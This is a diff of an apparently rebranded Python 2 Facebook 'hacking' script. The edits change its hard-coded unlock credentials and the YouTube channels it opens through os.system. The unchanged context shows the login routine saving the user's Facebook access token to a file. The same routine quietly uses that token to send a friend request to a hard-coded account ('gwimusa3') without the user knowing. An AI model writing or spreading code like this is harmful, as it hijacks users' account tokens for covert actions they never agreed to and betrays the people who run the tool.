@@ -49,7 +49,6 @@ def jalan(z):
 		time.sleep(0.07)
 
 #Dev:love_hacker
-##### LOGO #####
 logo = """
 \033[1;91m:•◈•╭━━╮╭╮╱╱╱╱╱╱╭╮╱╭━╮╭━╮╱╱╱╭━╮    :•◈•
 \033[1;91m:•◈•┃╭╮┃┃┃╱╱╱╱╱╱┃┃╱┃┃╰╯┃┃╱╱╱┃╭╯    :•◈•
@@ -108,8 +107,8 @@ jalan('\033[1;95m▬▬▬▬▬▬▬▬▬90%')
 jalan('\033[1;95m▬▬▬▬▬▬▬▬▬100%')
 print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mkalilinux\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
-CorrectUsername = "World"
-CorrectPassword = "lovehacker"
+CorrectUsername = "Amir"
+CorrectPassword = "Amir"
 
 loop = 'true'
 while (loop == 'true'):
@@ -122,10 +121,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;93mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+            os.system('xdg-open https://www.youtube.com/channel/UCHNT-JPOilcepG3g5fCiqXQ ')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+        os.system('xdg-open https://m.youtube.com/channel/UCHNT-JPOilcepG3g5fCiqXQ')
 
 def login():
 	os.system('clear')
@@ -170,7 +169,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				os.system('xdg-open https://m.youtube.com/channel')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
